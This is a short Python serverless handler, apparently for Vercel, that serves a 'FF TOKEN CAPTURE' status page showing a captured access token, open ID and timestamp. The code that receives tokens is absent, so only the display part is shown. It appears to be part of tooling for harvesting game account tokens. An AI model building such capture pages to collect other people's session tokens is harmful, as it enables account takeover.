from http.server import BaseHTTPRequestHandler
import json
import time

tokens = {}

def get_html():
    data = tokens.get('latest')
    
    if data:
        status = "✅ Token Captured!"
        status_color = "#00ff00"
        token_display = data.get('access_token', 'N/A')
        openid_display = data.get('open_id', 'N/A')
        time_display = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(data.get('timestamp', 0)))
    else:
        status = "⏳ Waiting for token..."
        status_color = "#eab308"
        token_display = "Not captured yet"
        openid_display = "Not captured yet"
        time_display = "Waiting..."
    
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF Token Capture</title>
    <meta http-equiv="refresh" content="5">
    <style>
        * {{ box-sizing: border-box; }}
        body {{
            font-family: monospace;
            background: #0a0a0a;
            color: #00ff00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }}
        .box {{
            background: #1a1a1a;
            padding: 35px;
            border-radius: 15px;
            border: 2px solid #00ff00;
            box-shadow: 0 0 25px rgba(0, 255, 0, 0.2);
            max-width: 600px;
            width: 100%;
        }}
        h1 {{
            text-align: center;
            color: #00ff00;
            margin-top: 0;
            font-size: 24px;
        }}
        .label {{
            color: #888;
            margin-top: 16px;
            font-weight: bold;
            font-size: 14px;
        }}
        .value {{
            background: #0a0a0a;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #333;
            word-break: break-all;
            margin-top: 5px;
            color: #ffffff;
            font-size: 14px;
        }}
        .status {{
            text-align: center;
            padding: 12px;
            border: 1px solid {status_color};
            border-radius: 8px;
            margin-top: 22px;
            font-weight: bold;
            color: {status_color};
        }}
    </style>
</head>
<body>
    <div class="box">
        <h1>💀 FF TOKEN CAPTURE</h1>
        <div class="label">📱 Access Token</div>
        <div class="value">{token_display}</div>
        <div class="label">🆔 Open ID</div>
        <div class="value">{openid_display}</div>
        <div class="label">📅 Timestamp</div>
        <div class="value">{time_display}</div>
        <div class="status">{status}</div>
    </div>
</body>
</html>"""


# Vercel BaseHTTPRequestHandler Handler
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        html_content = get_html()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))